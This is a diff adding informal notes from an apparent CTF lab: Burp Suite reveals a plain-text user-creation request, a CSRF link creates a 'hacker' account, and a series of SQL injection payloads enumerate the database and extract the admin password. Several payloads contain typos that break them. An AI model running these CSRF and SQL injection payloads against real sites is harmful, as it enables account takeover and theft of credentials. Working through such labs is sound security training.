@@ -1,0 +1,17 @@
+1. start open burpsuit
+2. go to demo and I saw access admin with password admin then create user and burpsuit observed that 
+GET https://xxxx/yyy/newUser?username=test&password=test1&password2=test2 in plain text
+3. let's go to ctf and apply csrf (cross-site request forgery) and submit option typing
+<a href="http:/localhost/newUser?username=hacker&password=hacker1&password2=hacker2">clickme</a>
+4. login with credential before created and find first flag
+5. observed in url id=1 etc so apply ' verify if any error and apply sql injection
+6. trying id=1 AND 1=1 TRUE page without error 
+7. ennumearate base data: id=1 AND 1=1 ORDER BY 3
+8. id=-1(set zero) UNION SELECT 1,2,3
+9. review type name database and version: id=-1 UNION SELECT 1,VERSION(),DATABASE()
+10. search tables and columns:
+10.1 id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLES_SCHEMA=DATABASE()
+10.2 id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLES_SCHEMA=DATABASE() AND TABLE_NAME="users"
+11. search admin's pasword
+id=-1 UNION SELECT 1,password,3 FROM users WHERE username='admin'
+
